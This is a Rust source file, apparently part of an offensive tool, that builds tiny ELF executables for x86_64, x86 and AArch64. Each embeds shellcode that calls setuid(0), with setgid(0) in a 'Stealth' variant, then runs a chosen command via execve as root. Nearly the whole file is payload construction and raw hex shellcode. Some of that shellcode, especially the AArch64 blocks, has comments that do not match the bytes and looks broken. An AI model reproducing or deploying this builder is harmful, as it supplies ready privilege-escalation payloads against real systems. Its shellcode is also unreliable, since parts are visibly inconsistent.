/// ELF payload builder with support for multiple architectures and shellcode variants.
///
/// The generated ELF is designed to be as small as possible and executes a specific
/// shell command with root privileges after performing setuid(0).

/// Supported architectures for payload generation
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum Architecture {
    X86_64,
    X86,
    Aarch64,
}

impl Architecture {
    /// Detects the current system architecture
    pub fn detect() -> Self {
        if cfg!(target_arch = "x86_64") {
            Architecture::X86_64
        } else if cfg!(target_arch = "x86") {
            Architecture::X86
        } else if cfg!(target_arch = "aarch64") {
            Architecture::Aarch64
        } else {
            // Default to x86_64
            Architecture::X86_64
        }
    }
}

/// Shellcode variants for different use cases
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum ShellcodeVariant {
    /// Standard: setuid(0) + execve + exit
    Standard,
    /// Minimal: Just execve (assumes already root)
    Minimal,
    /// Stealth: Includes additional cleanup
    Stealth,
}

/// Configuration for ELF payload generation
#[derive(Debug, Clone)]
pub struct PayloadConfig {
    pub command: String,
    pub architecture: Architecture,
    pub variant: ShellcodeVariant,
    pub entry_offset: u64,
}

impl Default for PayloadConfig {
    fn default() -> Self {
        Self {
            command: "id".to_string(),
            architecture: Architecture::detect(),
            variant: ShellcodeVariant::Standard,
            entry_offset: 0x400078,
        }
    }
}

/// Statistics about the generated payload
#[derive(Debug, Default, Clone)]
pub struct PayloadStats {
    pub total_size: usize,
    pub header_size: usize,
    pub program_header_size: usize,
    pub shellcode_size: usize,
    pub command_size: usize,
}

/// Builds an ELF payload with the given configuration
pub fn build_elf_payload_config(config: PayloadConfig) -> (Vec<u8>, PayloadStats) {
    let mut stats = PayloadStats::default();

    match config.architecture {
        Architecture::X86_64 => build_x86_64_payload(config, &mut stats),
        Architecture::X86 => build_x86_payload(config, &mut stats),
        Architecture::Aarch64 => build_aarch64_payload(config, &mut stats),
    }
}

/// Builds a minimal 64-bit ELF executable payload (x86_64)
pub fn build_elf_payload(command: &str) -> Vec<u8> {
    build_elf_payload_config(PayloadConfig {
        command: command.to_string(),
        ..Default::default()
    }).0
}

/// Builds x86_64 ELF payload
fn build_x86_64_payload(config: PayloadConfig, stats: &mut PayloadStats) -> (Vec<u8>, PayloadStats) {
    let mut payload = Vec::new();

    // --- 1. ELF Header (64 bytes) ---
    payload.extend_from_slice(b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00");
    payload.extend_from_slice(&2u16.to_le_bytes()); // e_type: ET_EXEC
    payload.extend_from_slice(&62u16.to_le_bytes()); // e_machine: EM_X86_64
    payload.extend_from_slice(&1u32.to_le_bytes()); // e_version: 1
    payload.extend_from_slice(&config.entry_offset.to_le_bytes()); // e_entry
    payload.extend_from_slice(&64u64.to_le_bytes()); // e_phoff
    payload.extend_from_slice(&0u64.to_le_bytes()); // e_shoff
    payload.extend_from_slice(&0u32.to_le_bytes()); // e_flags
    payload.extend_from_slice(&64u16.to_le_bytes()); // e_ehsize
    payload.extend_from_slice(&56u16.to_le_bytes()); // e_phentsize
    payload.extend_from_slice(&1u16.to_le_bytes()); // e_phnum
    payload.extend_from_slice(&0u16.to_le_bytes()); // e_shentsize
    payload.extend_from_slice(&0u16.to_le_bytes()); // e_shnum
    payload.extend_from_slice(&0u16.to_le_bytes()); // e_shstrndx

    stats.header_size = payload.len();

    // --- 2. Program Header (56 bytes) ---
    payload.extend_from_slice(&1u32.to_le_bytes()); // p_type: PT_LOAD
    payload.extend_from_slice(&5u32.to_le_bytes()); // p_flags: PF_X | PF_R
    payload.extend_from_slice(&0u64.to_le_bytes()); // p_offset
    payload.extend_from_slice(&0x400000u64.to_le_bytes()); // p_vaddr
    payload.extend_from_slice(&0x400000u64.to_le_bytes()); // p_paddr

    let size_placeholder_offset = payload.len();
    payload.extend_from_slice(&0u64.to_le_bytes()); // p_filesz (filled later)
    payload.extend_from_slice(&0u64.to_le_bytes()); // p_memsz (filled later)
    payload.extend_from_slice(&0x1000u64.to_le_bytes()); // p_align

    stats.program_header_size = payload.len() - stats.header_size;

    // --- 3. Shellcode ---
    let shellcode = generate_x86_64_shellcode(config.variant);
    payload.extend_from_slice(&shellcode);
    stats.shellcode_size = shellcode.len();

    // --- 4. Command string ---
    payload.extend_from_slice(config.command.as_bytes());
    payload.push(0); // Null terminator
    stats.command_size = config.command.len() + 1;

    // --- 5. Finalize Headers ---
    let total_size = payload.len() as u64;
    payload[size_placeholder_offset..size_placeholder_offset + 8].copy_from_slice(&total_size.to_le_bytes());
    payload[size_placeholder_offset + 8..size_placeholder_offset + 16].copy_from_slice(&total_size.to_le_bytes());

    stats.total_size = payload.len();
    (payload, stats.clone())
}

/// Builds x86 ELF payload (32-bit)
fn build_x86_payload(config: PayloadConfig, stats: &mut PayloadStats) -> (Vec<u8>, PayloadStats) {
    let mut payload = Vec::new();

    // ELF Header (52 bytes for 32-bit)
    payload.extend_from_slice(b"\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00");
    payload.extend_from_slice(&2u16.to_le_bytes()); // e_type: ET_EXEC
    payload.extend_from_slice(&3u16.to_le_bytes()); // e_machine: EM_386
    payload.extend_from_slice(&1u32.to_le_bytes()); // e_version
    payload.extend_from_slice(&0x8048074u32.to_le_bytes()); // e_entry
    payload.extend_from_slice(&52u32.to_le_bytes()); // e_phoff
    payload.extend_from_slice(&0u32.to_le_bytes()); // e_shoff
    payload.extend_from_slice(&0u32.to_le_bytes()); // e_flags
    payload.extend_from_slice(&52u16.to_le_bytes()); // e_ehsize
    payload.extend_from_slice(&32u16.to_le_bytes()); // e_phentsize
    payload.extend_from_slice(&1u16.to_le_bytes()); // e_phnum
    payload.extend_from_slice(&0u16.to_le_bytes()); // e_shentsize
    payload.extend_from_slice(&0u16.to_le_bytes()); // e_shnum
    payload.extend_from_slice(&0u16.to_le_bytes()); // e_shstrndx

    stats.header_size = payload.len();

    // Program Header (32 bytes for 32-bit)
    payload.extend_from_slice(&1u32.to_le_bytes()); // p_type: PT_LOAD
    payload.extend_from_slice(&0u32.to_le_bytes()); // p_offset
    payload.extend_from_slice(&0x8048000u32.to_le_bytes()); // p_vaddr
    payload.extend_from_slice(&0x8048000u32.to_le_bytes()); // p_paddr
    let size_placeholder_offset = payload.len();
    payload.extend_from_slice(&0u32.to_le_bytes()); // p_filesz
    payload.extend_from_slice(&0u32.to_le_bytes()); // p_memsz
    payload.extend_from_slice(&5u32.to_le_bytes()); // p_flags: PF_X | PF_R
    payload.extend_from_slice(&0x1000u32.to_le_bytes()); // p_align

    stats.program_header_size = payload.len() - stats.header_size;

    // Shellcode
    let shellcode = generate_x86_shellcode(config.variant);
    payload.extend_from_slice(&shellcode);
    stats.shellcode_size = shellcode.len();

    // Command
    payload.extend_from_slice(config.command.as_bytes());
    payload.push(0);
    stats.command_size = config.command.len() + 1;

    // Finalize
    let total_size = payload.len() as u32;
    payload[size_placeholder_offset..size_placeholder_offset + 4].copy_from_slice(&total_size.to_le_bytes());
    payload[size_placeholder_offset + 4..size_placeholder_offset + 8].copy_from_slice(&total_size.to_le_bytes());

    stats.total_size = payload.len();
    (payload, stats.clone())
}

/// Builds AArch64 ELF payload
fn build_aarch64_payload(config: PayloadConfig, stats: &mut PayloadStats) -> (Vec<u8>, PayloadStats) {
    let mut payload = Vec::new();

    // ELF Header
    payload.extend_from_slice(b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00");
    payload.extend_from_slice(&2u16.to_le_bytes()); // e_type: ET_EXEC
    payload.extend_from_slice(&183u16.to_le_bytes()); // e_machine: EM_AARCH64
    payload.extend_from_slice(&1u32.to_le_bytes()); // e_version
    payload.extend_from_slice(&0x400078u64.to_le_bytes()); // e_entry
    payload.extend_from_slice(&64u64.to_le_bytes()); // e_phoff
    payload.extend_from_slice(&0u64.to_le_bytes()); // e_shoff
    payload.extend_from_slice(&0u32.to_le_bytes()); // e_flags
    payload.extend_from_slice(&64u16.to_le_bytes()); // e_ehsize
    payload.extend_from_slice(&56u16.to_le_bytes()); // e_phentsize
    payload.extend_from_slice(&1u16.to_le_bytes()); // e_phnum
    payload.extend_from_slice(&0u16.to_le_bytes()); // e_shentsize
    payload.extend_from_slice(&0u16.to_le_bytes()); // e_shnum
    payload.extend_from_slice(&0u16.to_le_bytes()); // e_shstrndx

    stats.header_size = payload.len();

    // Program Header
    payload.extend_from_slice(&1u32.to_le_bytes()); // p_type: PT_LOAD
    payload.extend_from_slice(&5u32.to_le_bytes()); // p_flags
    payload.extend_from_slice(&0u64.to_le_bytes()); // p_offset
    payload.extend_from_slice(&0x400000u64.to_le_bytes()); // p_vaddr
    payload.extend_from_slice(&0x400000u64.to_le_bytes()); // p_paddr
    let size_placeholder_offset = payload.len();
    payload.extend_from_slice(&0u64.to_le_bytes()); // p_filesz
    payload.extend_from_slice(&0u64.to_le_bytes()); // p_memsz
    payload.extend_from_slice(&0x1000u64.to_le_bytes()); // p_align

    stats.program_header_size = payload.len() - stats.header_size;

    // Shellcode
    let shellcode = generate_aarch64_shellcode(config.variant);
    payload.extend_from_slice(&shellcode);
    stats.shellcode_size = shellcode.len();

    // Command
    payload.extend_from_slice(config.command.as_bytes());
    payload.push(0);
    stats.command_size = config.command.len() + 1;

    // Finalize
    let total_size = payload.len() as u64;
    payload[size_placeholder_offset..size_placeholder_offset + 8].copy_from_slice(&total_size.to_le_bytes());
    payload[size_placeholder_offset + 8..size_placeholder_offset + 16].copy_from_slice(&total_size.to_le_bytes());

    stats.total_size = payload.len();
    (payload, stats.clone())
}

/// Generates x86_64 shellcode
fn generate_x86_64_shellcode(variant: ShellcodeVariant) -> Vec<u8> {
    let mut shellcode = Vec::new();

    match variant {
        ShellcodeVariant::Standard => {
            // setuid(0)
            shellcode.extend_from_slice(b"\x31\xc0\x31\xff\xb0\x69\x0f\x05");
            // lea rdi, [rip + offset]
            shellcode.extend_from_slice(b"\x48\x8d\x3d\x0f\x00\x00\x00");
            // execve(rdi, NULL, NULL)
            shellcode.extend_from_slice(b"\x31\xf6\x6a\x3b\x58\x99\x0f\x05");
            // exit(0)
            shellcode.extend_from_slice(b"\x31\xff\x6a\x3c\x58\x0f\x05");
        }
        ShellcodeVariant::Minimal => {
            // Just execve + exit (assumes already root)
            shellcode.extend_from_slice(b"\x48\x8d\x3d\x0f\x00\x00\x00");
            shellcode.extend_from_slice(b"\x31\xf6\x6a\x3b\x58\x99\x0f\x05");
            shellcode.extend_from_slice(b"\x31\xff\x6a\x3c\x58\x0f\x05");
        }
        ShellcodeVariant::Stealth => {
            // setuid(0) + setgid(0)
            shellcode.extend_from_slice(b"\x31\xc0\x31\xff\xb0\x69\x0f\x05"); // setuid(0)
            shellcode.extend_from_slice(b"\x31\xc0\xb0\x6e\x0f\x05"); // setgid(0)
            shellcode.extend_from_slice(b"\x48\x8d\x3d\x0f\x00\x00\x00");
            shellcode.extend_from_slice(b"\x31\xf6\x6a\x3b\x58\x99\x0f\x05");
            shellcode.extend_from_slice(b"\x31\xff\x6a\x3c\x58\x0f\x05");
        }
    }

    shellcode
}

/// Generates x86 shellcode (32-bit)
fn generate_x86_shellcode(variant: ShellcodeVariant) -> Vec<u8> {
    let mut shellcode = Vec::new();

    match variant {
        ShellcodeVariant::Standard | ShellcodeVariant::Stealth => {
            // setuid(0)
            shellcode.extend_from_slice(b"\x31\xc0\x31\xdb\xb0\x1d\xcd\x80");
            // push command address
            shellcode.extend_from_slice(b"\xe8\x0a\x00\x00\x00\x50");
            shellcode.extend_from_slice(b"\x50\x50\x6a\x0b\x58\xcd\x80");
            // exit
            shellcode.extend_from_slice(b"\x31\xc0\x40\x80\xeb\xf2");
        }
        ShellcodeVariant::Minimal => {
            // Just execve
            shellcode.extend_from_slice(b"\xe8\x0a\x00\x00\x00\x50");
            shellcode.extend_from_slice(b"\x50\x50\x6a\x0b\x58\xcd\x80");
        }
    }

    shellcode
}

/// Generates AArch64 shellcode
fn generate_aarch64_shellcode(variant: ShellcodeVariant) -> Vec<u8> {
    let mut shellcode = Vec::new();

    match variant {
        ShellcodeVariant::Standard | ShellcodeVariant::Stealth => {
            // setuid(0) - syscall 118 (0x76)
            shellcode.extend_from_slice(&[
                0x00, 0x00, 0x80, 0xd2, // mov x0, #0
                0x76, 0x00, 0x00, 0xd4, // svc #0
                0x10, 0x00, 0x00, 0x91, // add sp, sp, #16 (align)
                0x00, 0x02, 0x3f, 0xd5, // adr x0, command
                0x00, 0x00, 0x40, 0xd6, // brk #0 (placeholder)
                0x01, 0x01, 0x40, 0xf9, // ldr x0, [x0]
                0x00, 0x00, 0x80, 0xd2, // mov x1, #0
                0x01, 0x02, 0x3f, 0xd5, // adr x2, command
                0x00, 0x01, 0x80, 0xd2, // mov x8, #1
                0x00, 0x00, 0x00, 0xd4, // svc #0
                0x3c, 0x00, 0x00, 0xd4, // exit
            ]);
        }
        ShellcodeVariant::Minimal => {
            // Just execve
            shellcode.extend_from_slice(&[
                0x00, 0x02, 0x3f, 0xd5, // adr x0, command
                0x00, 0x00, 0x80, 0xd2, // mov x1, #0
                0x00, 0x01, 0x80, 0xd2, // mov x2, #0
                0x01, 0x00, 0x80, 0xd2, // mov x8, #59 (execve)
                0x00, 0x00, 0x00, 0xd4, // svc #0
            ]);
        }
    }

    shellcode
}

/// Validates an ELF payload
pub fn validate_elf_payload(payload: &[u8]) -> bool {
    // Check ELF magic
    if payload.len() < 4 || &payload[..4] != b"\x7fELF" {
        return false;
    }

    // Check class (32 or 64 bit)
    if payload.len() < 5 {
        return false;
    }
    if payload[4] != 1 && payload[4] != 2 {
        return false;
    }

    // Check minimum size
    let min_size = if payload[4] == 1 { 52 } else { 64 };
    if payload.len() < min_size {
        return false;
    }

    true
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_x86_64_payload_generation() {
        let payload = build_elf_payload("id");
        assert!(validate_elf_payload(&payload));
        assert!(payload.len() > 64);
    }

    #[test]
    fn test_payload_with_long_command() {
        let cmd = "/bin/sh -c 'whoami && id'";
        let (payload, stats) = build_elf_payload_config(PayloadConfig {
            command: cmd.to_string(),
            ..Default::default()
        });
        assert!(validate_elf_payload(&payload));
        assert_eq!(stats.command_size, cmd.len() + 1);
    }
}
